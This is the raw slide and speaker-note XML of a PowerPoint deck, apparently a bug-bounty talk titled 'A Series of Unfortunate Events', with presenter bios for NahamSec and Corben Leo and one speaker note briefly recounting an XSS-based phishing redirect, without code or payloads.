          <p:cNvPr id="769" name="Google Shape;769;g28d5137f758_0_38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70" name="Google Shape;770;g28d5137f758_0_38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7" name="Shape 777"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="778" name="Google Shape;778;g28d5137f758_0_4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79" name="Google Shape;779;g28d5137f758_0_4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The link actually abused an XSS in the casino's website to redirect users to my phishing page.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:notes>
</file>

<file path=ppt/notesSlides/notesSlide8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7" name="Shape 787"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="788" name="Google Shape;788;g28d5137f758_0_4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89" name="Google Shape;789;g28d5137f758_0_4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6" name="Shape 796"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="797" name="Google Shape;797;g28d5137f758_0_46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98" name="Google Shape;798;g28d5137f758_0_4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5" name="Shape 805"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="806" name="Google Shape;806;g28d5137f758_0_48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07" name="Google Shape;807;g28d5137f758_0_48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4" name="Shape 814"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="815" name="Google Shape;815;g28d5137f758_0_48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16" name="Google Shape;816;g28d5137f758_0_48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3" name="Shape 823"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="824" name="Google Shape;824;g28d5137f758_0_47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25" name="Google Shape;825;g28d5137f758_0_47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2" name="Shape 832"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="833" name="Google Shape;833;g258cbd63437_0_7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34" name="Google Shape;834;g258cbd63437_0_7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1" name="Shape 841"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="842" name="Google Shape;842;g258cbd63437_0_76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43" name="Google Shape;843;g258cbd63437_0_7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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image13.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image18.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image17.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3.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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.kucoin.com" TargetMode="Externa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1.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.kucoin.com" TargetMode="Externa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4.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4.pn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7.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.pn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9.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/></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0.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5.png"/></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1.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:name.lastname@company.com" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:name.lastname@company.com" TargetMode="Externa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9.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.png"/></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0.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.png"/></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2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image8.png"/></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4.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image7.png"/></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5.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image16.png"/></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6.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.png"/></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8.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9.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:Ben@nahamsec.om"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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="53" name="Shape 53"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Google Shape;54;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311708" y="1481525"/>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
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t> Series of </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Unfortunate Event</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Google Shape;55;p13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="59" name="Shape 59"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Google Shape;60;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;61;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Google Shape;62;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2419800" y="2094175"/>
            <a:ext cx="4304400" cy="11235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6100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>About Us</a:t>
            </a:r>
            <a:endParaRPr sz="6100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Google Shape;63;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="67" name="Shape 67"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Google Shape;68;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;69;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Google Shape;70;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="992600" y="266850"/>
            <a:ext cx="3853200" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>NahamSec</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Google Shape;71;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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
        <p:nvSpPr>
          <p:cNvPr id="72" name="Google Shape;72;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8795100" cy="2970600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Hacking since I was a teenager </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Bug Bounty Hunting since 2013 </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Former Head of Hacker Education at HackerOne + VP at Hadrian Security</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Cofounder of HackingHub.io </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Content Creator / Public Speaker / Trainer (DEFCON 31)! </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Hacked into companies like Apple, Amazon, Zoom, Airbnb, Snapchat, and more with 1000+ findings so far</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="76" name="Shape 76"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Google Shape;77;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;78;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Google Shape;79;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="992600" y="266850"/>
            <a:ext cx="3853200" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>cdl</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="Google Shape;80;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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
        <p:nvSpPr>
          <p:cNvPr id="81" name="Google Shape;81;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="174450" y="1732225"/>
            <a:ext cx="8795100" cy="22626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 sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Hi I’m Corben Leo (@hacker_ on Twitter)</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Doing bug bounties since 2016</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
